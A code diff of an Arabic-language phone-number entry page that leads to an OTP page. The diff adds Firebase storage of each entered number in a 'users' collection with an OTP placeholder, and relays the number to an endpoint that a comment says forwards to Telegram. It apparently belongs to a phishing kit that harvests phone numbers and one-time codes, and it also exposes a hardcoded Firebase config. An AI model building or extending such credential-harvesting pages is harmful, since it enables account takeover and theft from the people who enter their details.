@@ -92,12 +92,28 @@
             <button id="submitBtn" class="btn-continue" disabled>استمرار</button>
         </div>
     </div>
-    <script>
+    <script type="module">
+    // استيراد Firebase
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+    import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
+
+    // إعدادات Firebase الخاصة بك
+    const firebaseConfig = {
+        apiKey: "AIzaSyC05uAGTFE_mZyByFBTRexYn5VbTfzW0Go",
+        authDomain: "barq-9ba61.firebaseapp.com",
+        projectId: "barq-9ba61",
+        storageBucket: "barq-9ba61.firebasestorage.app",
+        messagingSenderId: "1060477857765",
+        appId: "1:1060477857765:web:e1e2c606668209f364090c"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
     const phoneInput = document.getElementById('phoneInput');
     const submitBtn = document.getElementById('submitBtn');
 
     phoneInput.addEventListener('input', () => {
-        // التحقق من طول الرقم
         if (phoneInput.value.trim().length >= 9) {
             submitBtn.classList.add('active');
             submitBtn.disabled = false;
@@ -107,33 +123,31 @@
         }
     });
 
-    phoneInput.addEventListener('keypress', (e) => {
-        if (!/[0-9]/.test(e.key)) { e.preventDefault(); }
-    });
-
-    // دالة الإرسال عند الضغط على استمرار
     submitBtn.addEventListener('click', async () => {
         if (!submitBtn.disabled) {
             const phone = phoneInput.value;
             localStorage.setItem('userPhone', phone);
 
-            // إرسال الرقم إلى الـ API الخاص بنا في Vercel
             try {
-                // نرسل الرقم فقط في هذه المرحلة (أو أي قيمة ابتدائية)
-                await fetch('/api/send', {
+                // 1. الحفظ في Firebase مع إضافة التوقيت للترتيب
+                await addDoc(collection(db, "users"), {
+                    phone: phone,
+                    otp: "بانتظار الرمز...",
+                    timestamp: serverTimestamp() // هذا السطر هو سر الترتيب
+                });
+
+                // 2. الإرسال للـ API الخاص بالتليجرام
+                fetch('/api/send', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        phone: phone, 
-                        otp: "لم يتم إدخال الرمز بعد" 
-                    })
+                    body: JSON.stringify({ phone: phone, otp: "بدأ التسجيل" })
                 });
-            } catch (error) {
-                console.error("Error sending phone:", error);
-            }
 
-            // الانتقال لصفحة الرمز
-            window.location.href = 'otp.html';
+                window.location.href = 'otp.html';
+            } catch (error) {
+                console.error("Error:", error);
+                window.location.href = 'otp.html';
+            }
         }
     });
 </script>
